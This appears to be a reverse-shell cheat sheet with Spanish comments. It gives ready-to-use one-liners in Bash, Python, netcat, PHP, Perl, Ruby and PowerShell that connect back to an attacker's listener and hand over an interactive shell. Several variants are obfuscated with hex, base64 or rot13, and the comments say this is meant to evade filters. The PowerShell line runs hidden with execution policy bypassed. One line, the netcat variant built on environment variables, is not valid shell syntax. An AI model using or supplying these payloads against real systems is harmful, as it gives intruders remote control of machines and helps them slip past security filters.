# ======================================================

# Cambia <IP> y <PUERTO> por tu IP y puerto de escucha.
# Algunos incluyen ofuscación básica para evadir filtros.

# --- BASH (Linux) ---
bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1

# BASH ofuscado (hex)
echo 62617368202d69203e26202f6465762f7463702f3139322e3136382e312e31302f3434343420303e2631 | xxd -r -p | bash

# --- PYTHON ---
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python ofuscado (base64)
python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjxJUD4iLDxQVVk+KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ=='))"

# --- NC (si -e disponible) ---
nc -e /bin/sh <IP> <PUERTO>

# NC ofuscado usando variables de entorno
$@=$(which nc); $@ -e /bin/sh <IP> <PUERTO>

# --- PHP ---
php -r '$sock=fsockopen("<IP>",<PUERTO>);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP ofuscado con rot13
php -r 'eval(str_rot13("\$fxf=sfbpxbcra(\"<VC>\",<CHREG>);rkrp(\"/ova/fu -v <&3 >&3 2>&3\");"));'

# --- PERL ---
perl -e 'use Socket;$i="<IP>";$p=<PUERTO>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# --- RUBY ---
ruby -rsocket -e 'c=TCPSocket.new("<IP>","<PUERTO>");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.empty?;(system(l)) rescue nil}'

# --- POWERSHELL (Windows) ---
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('<IP>',<PUERTO>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
